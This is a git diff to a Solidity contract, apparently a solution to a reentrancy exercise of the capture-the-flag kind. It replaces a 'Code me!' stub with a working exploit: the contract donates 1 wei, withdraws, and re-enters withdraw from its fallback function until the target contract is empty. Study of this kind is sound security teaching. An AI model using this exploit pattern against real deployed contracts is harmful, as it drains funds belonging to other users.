@@ -1,6 +1,7 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.9;
 import "./Reentrance.sol";
+import "hardhat/console.sol";
 
 contract AttackingReentrance {
     address payable public contractAddress;
@@ -9,7 +10,14 @@ contract AttackingReentrance {
         contractAddress = _contractAddress;
     }
 
-    function hackContract() external {
-        // Code me!
+    fallback() external payable {
+        if (address(contractAddress).balance >= 1 ) {
+            Reentrance(contractAddress).withdraw();
+        }
+    }
+
+    function hackContract() external payable {
+        Reentrance(contractAddress).donate{value: 1 }(address(this));
+        Reentrance(contractAddress).withdraw();
     }
 }
